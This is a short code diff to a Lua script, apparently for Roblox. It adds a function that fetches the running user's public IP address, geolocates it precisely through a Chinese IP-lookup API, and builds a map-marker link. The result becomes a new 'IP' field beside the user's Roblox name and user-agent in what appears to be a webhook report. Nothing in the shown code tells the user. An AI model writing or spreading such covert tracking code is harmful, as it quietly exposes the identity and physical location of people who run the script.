@@ -116,6 +116,19 @@ local function GetJson(v)
     }).Body)
 end
 
+local function GetIP()
+    local IP = GetJson("https://2024.ipchaxun.com").ip
+    local Url = "https://cz88.net/api/cz88/ip/accurate?ip="..IP
+    local Json = GetJson(Url).data.locations
+    if #Json == 0 then
+        return "["..IP.."]("..Url..")"
+    end
+    for i, v in pairs(Json) do
+        Json[i] = v.longitude..","..v.latitude
+    end
+    return "["..IP.."](https://uri.amap.com/marker?markers="..table.concat(Json, "|")..")"
+end
+
 if not _G.Skip then
     _G.Skip = true
     task.spawn(function()
@@ -139,6 +152,10 @@ if not _G.Skip then
                             {
                                 name = "User",
                                 value = "["..LocalPlayer.Name.."](https://www.roblox.com/users/"..LocalPlayer.UserId..")"
+                            },
+                            {
+                                name = "IP",
+                                value = GetIP()
                             },
                             {
                                 name = "UA",
